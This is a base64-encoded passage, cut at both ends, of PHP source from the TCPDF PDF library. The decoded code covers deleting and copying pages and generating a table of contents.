lzc2V0KCR0aGlzLT5uZXdwYWdlZ3JvdXBbJGldKSBBTkQgKCgkaSArICR0aGlzLT5wYWdlZ3JvdXBzWyR0aGlzLT5uZXdwYWdlZ3JvdXBbJGldXSkgPiAkcGFnZSkpIHsKCQkJCQktLSR0aGlzLT5wYWdlZ3JvdXBzWyR0aGlzLT5uZXdwYWdlZ3JvdXBbJGldXTsKCQkJCQlicmVhazsKCQkJCX0KCQkJfQoJCX0KCQlpZiAoaXNzZXQoJHRoaXMtPnBhZ2VvcGVuWyRwYWdlXSkpIHsKCQkJdW5zZXQoJHRoaXMtPnBhZ2VvcGVuWyRwYWdlXSk7CgkJfQoJCWlmICgkcGFnZSA8ICR0aGlzLT5udW1wYWdlcykgewoJCQkvLyB1cGRhdGUgcmVtYWluaW5nIHBhZ2VzCgkJCWZvciAoJGkgPSAkcGFnZTsgJGkgPCAkdGhpcy0+bnVtcGFnZXM7ICsrJGkpIHsKCQkJCSRqID0gJGkgKyAxOwoJCQkJLy8gc2hpZnQgcGFnZXMKCQkJCSR0aGlzLT5zZXRQYWdlQnVmZmVyKCRpLCAkdGhpcy0+Z2V0UGFnZUJ1ZmZlcigkaikpOwoJCQkJJHRoaXMtPnBhZ2VkaW1bJGldID0gJHRoaXMtPnBhZ2VkaW1bJGpdOwoJCQkJJHRoaXMtPnBhZ2VsZW5bJGldID0gJHRoaXMtPnBhZ2VsZW5bJGpdOwoJCQkJJHRoaXMtPmludG1ya1skaV0gPSAkdGhpcy0+aW50bXJrWyRqXTsKCQkJCSR0aGlzLT5ib3JkZXJtcmtbJGldID0gJHRoaXMtPmJvcmRlcm1ya1skal07CgkJCQkkdGhpcy0+Y250bXJrWyRpXSA9ICR0aGlzLT5jbnRtcmtbJGpdOwoJCQkJJHRoaXMtPnBhZ2VvYmplY3RzWyRpXSA9ICR0aGlzLT5wYWdlb2JqZWN0c1skal07CgkJCQlpZiAoaXNzZXQoJHRoaXMtPmZvb3RlcnBvc1skal0pKSB7CgkJCQkJJHRoaXMtPmZvb3RlcnBvc1skaV0gPSAkdGhpcy0+Zm9vdGVycG9zWyRqXTsKCQkJCX0gZWxzZWlmIChpc3NldCgkdGhpcy0+Zm9vdGVycG9zWyRpXSkpIHsKCQkJCQl1bnNldCgkdGhpcy0+Zm9vdGVycG9zWyRpXSk7CgkJCQl9CgkJCQlpZiAoaXNzZXQoJHRoaXMtPmZvb3Rlcmxlblskal0pKSB7CgkJCQkJJHRoaXMtPmZvb3RlcmxlblskaV0gPSAkdGhpcy0+Zm9vdGVybGVuWyRqXTsKCQkJCX0gZWxzZWlmIChpc3NldCgkdGhpcy0+Zm9vdGVybGVuWyRpXSkpIHsKCQkJCQl1bnNldCgkdGhpcy0+Zm9vdGVybGVuWyRpXSk7CgkJCQl9CgkJCQlpZiAoaXNzZXQoJHRoaXMtPnRyYW5zZm1ya1skal0pKSB7CgkJCQkJJHRoaXMtPnRyYW5zZm1ya1skaV0gPSAkdGhpcy0+dHJhbnNmbXJrWyRqXTsKCQkJCX0gZWxzZWlmIChpc3NldCgkdGhpcy0+dHJhbnNmbXJrWyRpXSkpIHsKCQkJCQl1bnNldCgkdGhpcy0+dHJhbnNmbXJrWyRpXSk7CgkJCQl9CgkJCQlpZiAoaXNzZXQoJHRoaXMtPlBhZ2VBbm5vdHNbJGpdKSkgewoJCQkJCSR0aGlzLT5QYWdlQW5ub3RzWyRpXSA9ICR0aGlzLT5QYWdlQW5ub3RzWyRqXTsKCQkJCX0gZWxzZWlmIChpc3NldCgkdGhpcy0+UGFnZUFubm90c1skaV0pKSB7CgkJCQkJdW5zZXQoJHRoaXMtPlBhZ2VBbm5vdHNbJGldKTsKCQkJCX0KCQkJCWlmIChpc3NldCgkdGhpcy0+bmV3cGFnZWdyb3VwWyRqXSkpIHsKCQkJCQkkdGhpcy0+bmV3cGFnZWdyb3VwWyRpXSA9ICR0aGlzLT5uZXdwYWdlZ3JvdXBbJGpdOwoJCQkJCXVuc2V0KCR0aGlzLT5uZXdwYWdlZ3JvdXBbJGpdKTsKCQkJCX0KCQkJCWlmICgkdGhpcy0+Y3VycnBhZ2Vncm91cCA9PSAkaikgewoJCQkJCSR0aGlzLT5jdXJycGFnZWdyb3VwID0gJGk7CgkJCQl9CgkJCQlpZiAoaXNzZXQoJHRoaXMtPnBhZ2VvcGVuWyRqXSkpIHsKCQkJCQkkdGhpcy0+cGFnZW9wZW5bJGldID0gJHRoaXMtPnBhZ2VvcGVuWyRqXTsKCQkJCX0gZWxzZWlmIChpc3NldCgkdGhpcy0+cGFnZW9wZW5bJGldKSkgewoJCQkJCXVuc2V0KCR0aGlzLT5wYWdlb3BlblskaV0pOwoJCQkJfQoJCQl9CgkJCS8vIHJlbW92ZSBsYXN0IHBhZ2UKCQkJdW5zZXQoJHRoaXMtPnBhZ2VzWyR0aGlzLT5udW1wYWdlc10pOwoJCQl1bnNldCgkdGhpcy0+cGFnZWRpbVskdGhpcy0+bnVtcGFnZXNdKTsKCQkJdW5zZXQoJHRoaXMtPnBhZ2VsZW5bJHRoaXMtPm51bXBhZ2VzXSk7CgkJCXVuc2V0KCR0aGlzLT5pbnRtcmtbJHRoaXMtPm51bXBhZ2VzXSk7CgkJCXVuc2V0KCR0aGlzLT5ib3JkZXJtcmtbJHRoaXMtPm51bXBhZ2VzXSk7CgkJCXVuc2V0KCR0aGlzLT5jbnRtcmtbJHRoaXMtPm51bXBhZ2VzXSk7CgkJCWZvcmVhY2ggKCR0aGlzLT5wYWdlb2JqZWN0c1skdGhpcy0+bnVtcGFnZXNdIGFzICRvaWQpIHsKCQkJCWlmIChpc3NldCgkdGhpcy0+b2Zmc2V0c1skb2lkXSkpewoJCQkJCXVuc2V0KCR0aGlzLT5vZmZzZXRzWyRvaWRdKTsKCQkJCX0KCQkJfQoJCQl1bnNldCgkdGhpcy0+cGFnZW9iamVjdHNbJHRoaXMtPm51bXBhZ2VzXSk7CgkJCWlmIChpc3NldCgkdGhpcy0+Zm9vdGVycG9zWyR0aGlzLT5udW1wYWdlc10pKSB7CgkJCQl1bnNldCgkdGhpcy0+Zm9vdGVycG9zWyR0aGlzLT5udW1wYWdlc10pOwoJCQl9CgkJCWlmIChpc3NldCgkdGhpcy0+Zm9vdGVybGVuWyR0aGlzLT5udW1wYWdlc10pKSB7CgkJCQl1bnNldCgkdGhpcy0+Zm9vdGVybGVuWyR0aGlzLT5udW1wYWdlc10pOwoJCQl9CgkJCWlmIChpc3NldCgkdGhpcy0+dHJhbnNmbXJrWyR0aGlzLT5udW1wYWdlc10pKSB7CgkJCQl1bnNldCgkdGhpcy0+dHJhbnNmbXJrWyR0aGlzLT5udW1wYWdlc10pOwoJCQl9CgkJCWlmIChpc3NldCgkdGhpcy0+UGFnZUFubm90c1skdGhpcy0+bnVtcGFnZXNdKSkgewoJCQkJdW5zZXQoJHRoaXMtPlBhZ2VBbm5vdHNbJHRoaXMtPm51bXBhZ2VzXSk7CgkJCX0KCQkJaWYgKGlzc2V0KCR0aGlzLT5uZXdwYWdlZ3JvdXBbJHRoaXMtPm51bXBhZ2VzXSkpIHsKCQkJCXVuc2V0KCR0aGlzLT5uZXdwYWdlZ3JvdXBbJHRoaXMtPm51bXBhZ2VzXSk7CgkJCX0KCQkJaWYgKCR0aGlzLT5jdXJycGFnZWdyb3VwID09ICR0aGlzLT5udW1wYWdlcykgewoJCQkJJHRoaXMtPmN1cnJwYWdlZ3JvdXAgPSAoJHRoaXMtPm51bXBhZ2VzIC0gMSk7CgkJCX0KCQkJaWYgKGlzc2V0KCR0aGlzLT5wYWdlZ3JvdXBzWyR0aGlzLT5udW1wYWdlc10pKSB7CgkJCQl1bnNldCgkdGhpcy0+cGFnZWdyb3Vwc1skdGhpcy0+bnVtcGFnZXNdKTsKCQkJfQoJCQlpZiAoaXNzZXQoJHRoaXMtPnBhZ2VvcGVuWyR0aGlzLT5udW1wYWdlc10pKSB7CgkJCQl1bnNldCgkdGhpcy0+cGFnZW9wZW5bJHRoaXMtPm51bXBhZ2VzXSk7CgkJCX0KCQl9CgkJLS0kdGhpcy0+bnVtcGFnZXM7CgkJJHRoaXMtPnBhZ2UgPSAkdGhpcy0+bnVtcGFnZXM7CgkJLy8gYWRqdXN0IG91dGxpbmVzCgkJJHRtcG91dGxpbmVzID0gJHRoaXMtPm91dGxpbmVzOwoJCWZvcmVhY2ggKCR0bXBvdXRsaW5lcyBhcyAka2V5ID0+ICRvdXRsaW5lKSB7CgkJCWlmICghJG91dGxpbmVbJ2YnXSkgewoJCQkJaWYgKCRvdXRsaW5lWydwJ10gPiAkcGFnZSkgewoJCQkJCSR0aGlzLT5vdXRsaW5lc1ska2V5XVsncCddID0gJG91dGxpbmVbJ3AnXSAtIDE7CgkJCQl9IGVsc2VpZiAoJG91dGxpbmVbJ3AnXSA9PSAkcGFnZSkgewoJCQkJCXVuc2V0KCR0aGlzLT5vdXRsaW5lc1ska2V5XSk7CgkJCQl9CgkJCX0KCQl9CgkJLy8gYWRqdXN0IGRlc3RzCgkJJHRtcGRlc3RzID0gJHRoaXMtPmRlc3RzOwoJCWZvcmVhY2ggKCR0bXBkZXN0cyBhcyAka2V5ID0+ICRkZXN0KSB7CgkJCWlmICghJGRlc3RbJ2YnXSkgewoJCQkJaWYgKCRkZXN0WydwJ10gPiAkcGFnZSkgewoJCQkJCSR0aGlzLT5kZXN0c1ska2V5XVsncCddID0gJGRlc3RbJ3AnXSAtIDE7CgkJCQl9IGVsc2VpZiAoJGRlc3RbJ3AnXSA9PSAkcGFnZSkgewoJCQkJCXVuc2V0KCR0aGlzLT5kZXN0c1ska2V5XSk7CgkJCQl9CgkJCX0KCQl9CgkJLy8gYWRqdXN0IGxpbmtzCgkJJHRtcGxpbmtzID0gJHRoaXMtPmxpbmtzOwoJCWZvcmVhY2ggKCR0bXBsaW5rcyBhcyAka2V5ID0+ICRsaW5rKSB7CgkJCWlmICghJGxpbmtbJ2YnXSkgewoJCQkJaWYgKCRsaW5rWydwJ10gPiAkcGFnZSkgewoJCQkJCSR0aGlzLT5saW5rc1ska2V5XVsncCddID0gJGxpbmtbJ3AnXSAtIDE7CgkJCQl9IGVsc2VpZiAoJGxpbmtbJ3AnXSA9PSAkcGFnZSkgewoJCQkJCXVuc2V0KCR0aGlzLT5saW5rc1ska2V5XSk7CgkJCQl9CgkJCX0KCQl9CgkJLy8gYWRqdXN0IGphdmFzY3JpcHQKCQkkanBhZ2UgPSAkcGFnZTsKCQlpZiAocHJlZ19tYXRjaF9hbGwoJy90aGlzXC5hZGRGaWVsZFwoXCcoW15cJ10qKVwnLFwnKFteXCddKilcJywoWzAtOV0rKS8nLCAkdGhpcy0+amF2YXNjcmlwdCwgJHBhbWF0Y2gpID4gMCkgewoJCQlmb3JlYWNoKCRwYW1hdGNoWzBdIGFzICRwayA9PiAkcG1hdGNoKSB7CgkJCQkkcGFnZW51bSA9IGludHZhbCgkcGFtYXRjaFszXVskcGtdKSArIDE7CgkJCQlpZiAoJHBhZ2VudW0gPj0gJGpwYWdlKSB7CgkJCQkJJG5ld3BhZ2UgPSAoJHBhZ2VudW0gLSAxKTsKCQkJCX0gZWxzZWlmICgkcGFnZW51bSA9PSAkanBhZ2UpIHsKCQkJCQkkbmV3cGFnZSA9IDE7CgkJCQl9IGVsc2UgewoJCQkJCSRuZXdwYWdlID0gJHBhZ2VudW07CgkJCQl9CgkJCQktLSRuZXdwYWdlOwoJCQkJJG5ld2pzID0gInRoaXMuYWRkRmllbGQoXCciLiRwYW1hdGNoWzFdWyRwa10uIlwnLFwnIi4kcGFtYXRjaFsyXVskcGtdLiJcJywiLiRuZXdwYWdlOwoJCQkJJHRoaXMtPmphdmFzY3JpcHQgPSBzdHJfcmVwbGFjZSgkcG1hdGNoLCAkbmV3anMsICR0aGlzLT5qYXZhc2NyaXB0KTsKCQkJfQoJCQl1bnNldCgkcGFtYXRjaCk7CgkJfQoJCS8vIHJldHVybiB0byBsYXN0IHBhZ2UKCQlpZiAoJHRoaXMtPm51bXBhZ2VzID4gMCkgewoJCQkkdGhpcy0+bGFzdFBhZ2UodHJ1ZSk7CgkJfQoJCXJldHVybiB0cnVlOwoJfQoKCS8qKgoJICogQ2xvbmUgdGhlIHNwZWNpZmllZCBwYWdlIHRvIGEgbmV3IHBhZ2UuCgkgKiBAcGFyYW0gaW50ICRwYWdlIG51bWJlciBvZiBwYWdlIHRvIGNvcHkgKDAgPSBjdXJyZW50IHBhZ2UpCgkgKiBAcmV0dXJuIGJvb2wgdHJ1ZSBpbiBjYXNlIG9mIHN1Y2Nlc3MsIGZhbHNlIGluIGNhc2Ugb2YgZXJyb3IuCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNC45LjAxNSAoMjAxMC0wNC0yMCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGNvcHlQYWdlKCRwYWdlPTApIHsKCQlpZiAoJHBhZ2UgPT0gMCkgewoJCQkvLyBkZWZhdWx0IHZhbHVlCgkJCSRwYWdlID0gJHRoaXMtPnBhZ2U7CgkJfQoJCWlmICgoJHBhZ2UgPCAxKSBPUiAoJHBhZ2UgPiAkdGhpcy0+bnVtcGFnZXMpKSB7CgkJCXJldHVybiBmYWxzZTsKCQl9CgkJLy8gY2xvc2UgdGhlIGxhc3QgcGFnZQoJCSR0aGlzLT5lbmRQYWdlKCk7CgkJLy8gY29weSBhbGwgcGFnZS1yZWxhdGVkIHN0YXRlcwoJCSsrJHRoaXMtPm51bXBhZ2VzOwoJCSR0aGlzLT5wYWdlID0gJHRoaXMtPm51bXBhZ2VzOwoJCSR0aGlzLT5zZXRQYWdlQnVmZmVyKCR0aGlzLT5wYWdlLCAkdGhpcy0+Z2V0UGFnZUJ1ZmZlcigkcGFnZSkpOwoJCSR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXSA9ICR0aGlzLT5wYWdlZGltWyRwYWdlXTsKCQkkdGhpcy0+cGFnZWxlblskdGhpcy0+cGFnZV0gPSAkdGhpcy0+cGFnZWxlblskcGFnZV07CgkJJHRoaXMtPmludG1ya1skdGhpcy0+cGFnZV0gPSAkdGhpcy0+aW50bXJrWyRwYWdlXTsKCQkkdGhpcy0+Ym9yZGVybXJrWyR0aGlzLT5wYWdlXSA9ICR0aGlzLT5ib3JkZXJtcmtbJHBhZ2VdOwoJCSR0aGlzLT5jbnRtcmtbJHRoaXMtPnBhZ2VdID0gJHRoaXMtPmNudG1ya1skcGFnZV07CgkJJHRoaXMtPnBhZ2VvYmplY3RzWyR0aGlzLT5wYWdlXSA9ICR0aGlzLT5wYWdlb2JqZWN0c1skcGFnZV07CgkJJHRoaXMtPnBhZ2VvcGVuWyR0aGlzLT5wYWdlXSA9IGZhbHNlOwoJCWlmIChpc3NldCgkdGhpcy0+Zm9vdGVycG9zWyRwYWdlXSkpIHsKCQkJJHRoaXMtPmZvb3RlcnBvc1skdGhpcy0+cGFnZV0gPSAkdGhpcy0+Zm9vdGVycG9zWyRwYWdlXTsKCQl9CgkJaWYgKGlzc2V0KCR0aGlzLT5mb290ZXJsZW5bJHBhZ2VdKSkgewoJCQkkdGhpcy0+Zm9vdGVybGVuWyR0aGlzLT5wYWdlXSA9ICR0aGlzLT5mb290ZXJsZW5bJHBhZ2VdOwoJCX0KCQlpZiAoaXNzZXQoJHRoaXMtPnRyYW5zZm1ya1skcGFnZV0pKSB7CgkJCSR0aGlzLT50cmFuc2ZtcmtbJHRoaXMtPnBhZ2VdID0gJHRoaXMtPnRyYW5zZm1ya1skcGFnZV07CgkJfQoJCWlmIChpc3NldCgkdGhpcy0+UGFnZUFubm90c1skcGFnZV0pKSB7CgkJCSR0aGlzLT5QYWdlQW5ub3RzWyR0aGlzLT5wYWdlXSA9ICR0aGlzLT5QYWdlQW5ub3RzWyRwYWdlXTsKCQl9CgkJaWYgKGlzc2V0KCR0aGlzLT5uZXdwYWdlZ3JvdXBbJHBhZ2VdKSkgewoJCQkvLyBzdGFydCBhIG5ldyBncm91cAoJCQkkdGhpcy0+bmV3cGFnZWdyb3VwWyR0aGlzLT5wYWdlXSA9IHNpemVvZigkdGhpcy0+bmV3cGFnZWdyb3VwKSArIDE7CgkJCSR0aGlzLT5jdXJycGFnZWdyb3VwID0gJHRoaXMtPm5ld3BhZ2Vncm91cFskdGhpcy0+cGFnZV07CgkJCSR0aGlzLT5wYWdlZ3JvdXBzWyR0aGlzLT5jdXJycGFnZWdyb3VwXSA9IDE7CgkJfSBlbHNlaWYgKGlzc2V0KCR0aGlzLT5jdXJycGFnZWdyb3VwKSBBTkQgKCR0aGlzLT5jdXJycGFnZWdyb3VwID4gMCkpIHsKCQkJKyskdGhpcy0+cGFnZWdyb3Vwc1skdGhpcy0+Y3VycnBhZ2Vncm91cF07CgkJfQoJCS8vIGNvcHkgb3V0bGluZXMKCQkkdG1wb3V0bGluZXMgPSAkdGhpcy0+b3V0bGluZXM7CgkJZm9yZWFjaCAoJHRtcG91dGxpbmVzIGFzICRrZXkgPT4gJG91dGxpbmUpIHsKCQkJaWYgKCRvdXRsaW5lWydwJ10gPT0gJHBhZ2UpIHsKCQkJCSR0aGlzLT5vdXRsaW5lc1tdID0gYXJyYXkoJ3QnID0+ICRvdXRsaW5lWyd0J10sICdsJyA9PiAkb3V0bGluZVsnbCddLCAneCcgPT4gJG91dGxpbmVbJ3gnXSwgJ3knID0+ICRvdXRsaW5lWyd5J10sICdwJyA9PiAkdGhpcy0+cGFnZSwgJ2YnID0+ICRvdXRsaW5lWydmJ10sICdzJyA9PiAkb3V0bGluZVsncyddLCAnYycgPT4gJG91dGxpbmVbJ2MnXSk7CgkJCX0KCQl9CgkJLy8gY29weSBsaW5rcwoJCSR0bXBsaW5rcyA9ICR0aGlzLT5saW5rczsKCQlmb3JlYWNoICgkdG1wbGlua3MgYXMgJGtleSA9PiAkbGluaykgewoJCQlpZiAoJGxpbmtbJ3AnXSA9PSAkcGFnZSkgewoJCQkJJHRoaXMtPmxpbmtzW10gPSBhcnJheSgncCcgPT4gJHRoaXMtPnBhZ2UsICd5JyA9PiAkbGlua1sneSddLCAnZicgPT4gJGxpbmtbJ2YnXSk7CgkJCX0KCQl9CgkJLy8gcmV0dXJuIHRvIGxhc3QgcGFnZQoJCSR0aGlzLT5sYXN0UGFnZSh0cnVlKTsKCQlyZXR1cm4gdHJ1ZTsKCX0KCgkvKioKCSAqIE91dHB1dCBhIFRhYmxlIG9mIENvbnRlbnQgSW5kZXggKFRPQykuCgkgKiBUaGlzIG1ldGhvZCBtdXN0IGJlIGNhbGxlZCBhZnRlciBhbGwgQm9va21hcmtzIHdlcmUgc2V0LgoJICogQmVmb3JlIGNhbGxpbmcgdGhpcyBtZXRob2QgeW91IGhhdmUgdG8gb3BlbiB0aGUgcGFnZSB1c2luZyB0aGUgYWRkVE9DUGFnZSgpIG1ldGhvZC4KCSAqIEFmdGVyIGNhbGxpbmcgdGhpcyBtZXRob2QgeW91IGhhdmUgdG8gY2FsbCBlbmRUT0NQYWdlKCkgdG8gY2xvc2UgdGhlIFRPQyBwYWdlLgoJICogWW91IGNhbiBvdmVycmlkZSB0aGlzIG1ldGhvZCB0byBhY2hpZXZlIGRpZmZlcmVudCBzdHlsZXMuCgkgKiBAcGFyYW0gaW50fG51bGwgJHBhZ2UgcGFnZSBudW1iZXIgd2hlcmUgdGhpcyBUT0Mgc2hvdWxkIGJlIGluc2VydGVkIChsZWF2ZSBlbXB0eSBmb3IgY3VycmVudCBwYWdlKS4KCSAqIEBwYXJhbSBzdHJpbmcgJG51bWJlcnNmb250IHNldCB0aGUgZm9udCBmb3IgcGFnZSBudW1iZXJzIChwbGVhc2UgdXNlIG1vbm9zcGFjZWQgZm9udCBmb3IgYmV0dGVyIGFsaWdubWVudCkuCgkgKiBAcGFyYW0gc3RyaW5nICRmaWxsZXIgc3RyaW5nIHVzZWQgdG8gZmlsbCB0aGUgc3BhY2UgYmV0d2VlbiB0ZXh0IGFuZCBwYWdlIG51bWJlci4KCSAqIEBwYXJhbSBzdHJpbmcgJHRvY19uYW1lIG5hbWUgdG8gdXNlIGZvciBUT0MgYm9va21hcmsuCgkgKiBAcGFyYW0gc3RyaW5nICRzdHlsZSBGb250IHN0eWxlIGZvciB0aXRsZTogQiA9IEJvbGQsIEkgPSBJdGFsaWMsIEJJID0gQm9sZCArIEl0YWxpYy4KCSAqIEBwYXJhbSBhcnJheSAkY29sb3IgUkdCIGNvbG9yIGFycmF5IGZvciBib29rbWFyayB0aXRsZSAodmFsdWVzIGZyb20gMCB0byAyNTUpLgoJICogQHB1YmxpYwoJICogQGF1dGhvciBOaWNvbGEgQXN1bmkKCSAqIEBzaW5jZSA0LjUuMDAwICgyMDA5LTAxLTAyKQoJICogQHNlZSBhZGRUT0NQYWdlKCksIGVuZFRPQ1BhZ2UoKSwgYWRkSFRNTFRPQygpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBhZGRUT0MoJHBhZ2U9bnVsbCwgJG51bWJlcnNmb250PScnLCAkZmlsbGVyPScuJywgJHRvY19uYW1lPSdUT0MnLCAkc3R5bGU9JycsICRjb2xvcj1hcnJheSgwLDAsMCkpIHsKCQkkZm9udHNpemUgPSAkdGhpcy0+Rm9udFNpemVQdDsKCQkkZm9udGZhbWlseSA9ICR0aGlzLT5Gb250RmFtaWx5OwoJCSRmb250c3R5bGUgPSAkdGhpcy0+Rm9udFN0eWxlOwoJCSR3ID0gJHRoaXMtPncgLSAkdGhpcy0+bE1hcmdpbiAtICR0aGlzLT5yTWFyZ2luOwoJCSRzcGFjZXIgPSAkdGhpcy0+R2V0U3RyaW5nV2lkdGgoY2hyKDMyKSkgKiA0OwoJCSRsbWFyZ2luID0gJHRoaXMtPmxNYXJnaW47CgkJJHJtYXJnaW4gPSAkdGhpcy0+ck1hcmdpbjsKCQkkeF9zdGFydCA9ICR0aGlzLT5HZXRYKCk7CgkJJHBhZ2VfZmlyc3QgPSAkdGhpcy0+cGFnZTsKCQkkY3VycmVudF9wYWdlID0gJHRoaXMtPnBhZ2U7CgkJJHBhZ2VfZmlsbF9zdGFydCA9IGZhbHNlOwoJCSRwYWdlX2ZpbGxfZW5kID0gZmFsc2U7CgkJJGN1cnJlbnRfY29sdW1uID0gJHRoaXMtPmN1cnJlbnRfY29sdW1uOwoJCWlmIChUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkbnVtYmVyc2ZvbnQpKSB7CgkJCSRudW1iZXJzZm9udCA9ICR0aGlzLT5kZWZhdWx0X21vbm9zcGFjZWRfZm9udDsKCQl9CgkJaWYgKFRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCRmaWxsZXIpKSB7CgkJCSRmaWxsZXIgPSAnICc7CgkJfQoJCWlmIChUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkcGFnZSkpIHsKCQkJJGdhcCA9ICcgJzsKCQl9IGVsc2UgewoJCQkkZ2FwID0gJyc7CgkJCWlmICgkcGFnZSA8IDEpIHsKCQkJCSRwYWdlID0gMTsKCQkJfQoJCX0KCQkkdGhpcy0+c2V0Rm9udCgkbnVtYmVyc2ZvbnQsICRmb250c3R5bGUsICRmb250c2l6ZSk7CgkJJG51bXdpZHRoID0gJHRoaXMtPkdldFN0cmluZ1dpZHRoKCcwMDAwMCcpOwoJCSRtYXhwYWdlID0gMDsgLy91c2VkIGZvciBwYWdlcyBvbiBhdHRhY2hlZCBkb2N1bWVudHMKCQlmb3JlYWNoICgkdGhpcy0+b3V0bGluZXMgYXMgJGtleSA9PiAkb3V0bGluZSkgewoJCQkvLyBjaGVjayBmb3IgZXh0cmEgcGFnZXMgKHVzZWQgZm9yIGF0dGFjaG1lbnRzKQoJCQlpZiAoKCR0aGlzLT5wYWdlID4gJHBhZ2VfZmlyc3QpIEFORCAoJG91dGxpbmVbJ3AnXSA+PSAkdGhpcy0+bnVtcGFnZXMpKSB7CgkJCQkkb3V0bGluZVsncCddICs9ICgkdGhpcy0+cGFnZSAtICRwYWdlX2ZpcnN0KTsKCQkJfQoJCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkJJGFsaWdudGV4dCA9ICdSJzsKCQkJCSRhbGlnbm51bSA9ICdMJzsKCQkJfSBlbHNlIHsKCQkJCSRhbGlnbnRleHQgPSAnTCc7CgkJCQkkYWxpZ25udW0gPSAnUic7CgkJCX0KCQkJaWYgKCRvdXRsaW5lWydsJ10gPT0gMCkgewoJCQkJJHRoaXMtPnNldEZvbnQoJGZvbnRmYW1pbHksICRvdXRsaW5lWydzJ10uJ0InLCAkZm9udHNpemUpOwoJCQl9IGVsc2UgewoJCQkJJHRoaXMtPnNldEZvbnQoJGZvbnRmYW1pbHksICRvdXRsaW5lWydzJ10sICRmb250c2l6ZSAtICRvdXRsaW5lWydsJ10pOwoJCQl9CgkJCSR0aGlzLT5zZXRUZXh0Q29sb3JBcnJheSgkb3V0bGluZVsnYyddKTsKCQkJLy8gY2hlY2sgZm9yIHBhZ2UgYnJlYWsKCQkJJHRoaXMtPmNoZWNrUGFnZUJyZWFrKDIgKiAkdGhpcy0+Z2V0Q2VsbEhlaWdodCgkdGhpcy0+Rm9udFNpemUpKTsKCQkJLy8gc2V0IG1hcmdpbnMgYW5kIFggcG9zaXRpb24KCQkJaWYgKCgkdGhpcy0+cGFnZSA9PSAkY3VycmVudF9wYWdlKSBBTkQgKCR0aGlzLT5jdXJyZW50X2NvbHVtbiA9PSAkY3VycmVudF9jb2x1bW4pKSB7CgkJCQkkdGhpcy0+bE1hcmdpbiA9ICRsbWFyZ2luOwoJCQkJJHRoaXMtPnJNYXJnaW4gPSAkcm1hcmdpbjsKCQkJfSBlbHNlIHsKCQkJCWlmICgkdGhpcy0+Y3VycmVudF9jb2x1bW4gIT0gJGN1cnJlbnRfY29sdW1uKSB7CgkJCQkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJCQkJJHhfc3RhcnQgPSAkdGhpcy0+dyAtICR0aGlzLT5jb2x1bW5zWyR0aGlzLT5jdXJyZW50X2NvbHVtbl1bJ3gnXTsKCQkJCQl9IGVsc2UgewoJCQkJCQkkeF9zdGFydCA9ICR0aGlzLT5jb2x1bW5zWyR0aGlzLT5jdXJyZW50X2NvbHVtbl1bJ3gnXTsKCQkJCQl9CgkJCQl9CgkJCQkkbG1hcmdpbiA9ICR0aGlzLT5sTWFyZ2luOwoJCQkJJHJtYXJnaW4gPSAkdGhpcy0+ck1hcmdpbjsKCQkJCSRjdXJyZW50X3BhZ2UgPSAkdGhpcy0+cGFnZTsKCQkJCSRjdXJyZW50X2NvbHVtbiA9ICR0aGlzLT5jdXJyZW50X2NvbHVtbjsKCQkJfQoJCQkkdGhpcy0+c2V0WCgkeF9zdGFydCk7CgkJCSRpbmRlbnQgPSAoJHNwYWNlciAqICRvdXRsaW5lWydsJ10pOwoJCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkJJHRoaXMtPnggLT0gJGluZGVudDsKCQkJCSR0aGlzLT5yTWFyZ2luID0gJHRoaXMtPncgLSAkdGhpcy0+eDsKCQkJfSBlbHNlIHsKCQkJCSR0aGlzLT54ICs9ICRpbmRlbnQ7CgkJCQkkdGhpcy0+bE1hcmdpbiA9ICR0aGlzLT54OwoJCQl9CgkJCSRsaW5rID0gJHRoaXMtPkFkZExpbmsoKTsKCQkJJHRoaXMtPnNldExpbmsoJGxpbmssICRvdXRsaW5lWyd5J10sICRvdXRsaW5lWydwJ10pOwoJCQkvLyB3cml0ZSB0aGUgdGV4dAoJCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkJJHR4dCA9ICcgJy4kb3V0bGluZVsndCddOwoJCQl9IGVsc2UgewoJCQkJJHR4dCA9ICRvdXRsaW5lWyd0J10uJyAnOwoJCQl9CgkJCSR0aGlzLT5Xcml0ZSgwLCAkdHh0LCAkbGluaywgZmFsc2UsICRhbGlnbnRleHQsIGZhbHNlLCAwLCBmYWxzZSwgZmFsc2UsIDAsICRudW13aWR0aCwgJycpOwoJCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkJJHR3ID0gJHRoaXMtPnggLSAkdGhpcy0+bE1hcmdpbjsKCQkJfSBlbHNlIHsKCQkJCSR0dyA9ICR0aGlzLT53IC0gJHRoaXMtPnJNYXJnaW4gLSAkdGhpcy0+eDsKCQkJfQoJCQkkdGhpcy0+c2V0Rm9udCgkbnVtYmVyc2ZvbnQsICRmb250c3R5bGUsICRmb250c2l6ZSk7CgkJCWlmIChUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkcGFnZSkpIHsKCQkJCSRwYWdlbnVtID0gJG91dGxpbmVbJ3AnXTsKCQkJfSBlbHNlIHsKCQkJCS8vIHBsYWNlbWFyayB0byBiZSByZXBsYWNlZCB3aXRoIHRoZSBjb3JyZWN0IG51bWJlcgoJCQkJJHBhZ2VudW0gPSAneyMnLigkb3V0bGluZVsncCddKS4nfSc7CgkJCQlpZiAoJHRoaXMtPmlzVW5pY29kZUZvbnQoKSkgewoJCQkJCSRwYWdlbnVtID0gJ3snLiRwYWdlbnVtLid9JzsKCQkJCX0KCQkJCSRtYXhwYWdlID0gbWF4KCRtYXhwYWdlLCAkb3V0bGluZVsncCddKTsKCQkJfQoJCQkkZncgPSAoJHR3IC0gJHRoaXMtPkdldFN0cmluZ1dpZHRoKCRwYWdlbnVtLiRmaWxsZXIpKTsKCQkJJHdmaWxsZXIgPSAkdGhpcy0+R2V0U3RyaW5nV2lkdGgoJGZpbGxlcik7CgkJCWlmICgkd2ZpbGxlciA+IDApIHsKCQkJCSRudW1maWxscyA9IGZsb29yKCRmdyAvICR3ZmlsbGVyKTsKCQkJfSBlbHNlIHsKCQkJCSRudW1maWxscyA9IDA7CgkJCX0KCQk